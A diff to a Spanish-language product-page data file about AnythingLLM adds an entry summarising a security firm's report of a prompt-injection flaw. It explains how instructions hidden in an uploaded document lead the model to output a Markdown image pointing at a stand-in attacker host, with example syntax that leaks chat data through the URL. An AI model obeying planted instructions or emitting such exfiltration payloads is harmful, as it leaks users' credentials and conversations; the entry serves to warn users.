@@ -32,6 +32,14 @@
       "body": "Tiene sentido si tu prioridad es trabajar con documentos, crear espacios de conocimiento o probar RAG sin programar todo desde cero. Para simplemente conversar con un modelo local, Jan AI o LM Studio pueden ser más directos. Para automatizar desde terminal o integrarlo con herramientas de desarrollo, Ollama puede resultar más flexible.\n\nLa decisión depende de tu flujo: documentos y conocimiento organizado apuntan a AnythingLLM; exploración de modelos apunta a LM Studio o Jan; infraestructura ligera apunta a Ollama."
     }
   ],
+  "communityInsights": [
+    {
+      "text": "El 29 de julio de 2025, la firma de seguridad mgm security partners publicó un análisis de una vulnerabilidad de inyección de prompts cruzada (identificada como CVE-2025-44822) en AnythingLLM, reportada de forma responsable a Mintplex Labs el 3 de marzo de 2025 con un plazo de divulgación hasta el 15 de junio de 2025. El ataque funciona en dos etapas: un atacante incrusta instrucciones maliciosas en una fuente de datos no confiable (un documento, sitio web o plugin que subís a la herramienta); como los modelos de lenguaje no distinguen instrucciones legítimas de hostiles, el modelo las ejecuta y genera una sintaxis de imagen en Markdown como `![image](http://atacante.com/logo.png?q=DATOS_SENSIBLES)`. Cuando AnythingLLM renderiza esa imagen, solicita el archivo al servidor del atacante de forma invisible, filtrando los datos capturados a través de los parámetros de la URL. Esto permite interceptar mensajes posteriores dentro del mismo chat, extraer información sensible del historial de conversación (como credenciales de AWS mencionadas en el análisis) y comprometer todo un espacio de trabajo a partir de un solo documento malicioso, todo sin que el usuario lo note. Según el artículo, la versión v1.8.4 (28 de julio de 2025) seguía sin parche al momento de la publicación. Es un motivo concreto para no cargar documentos ni conectar sitios de origen no confiable en AnythingLLM, tal como recomienda esta ficha más abajo, en la sección de seguridad.",
+      "source": "https://www.mgm-sp.com/en/blog-and-news/anythingllm-under-the-microscope-identifying-and-addressing-security-flaws/",
+      "sourceLabel": "mgm security partners — vulnerabilidad de inyección de prompts en AnythingLLM (CVE-2025-44822)",
+      "date": "2025-07-29"
+    }
+  ],
   "faq": [
     {
       "question": "¿AnythingLLM tiene app de escritorio?",
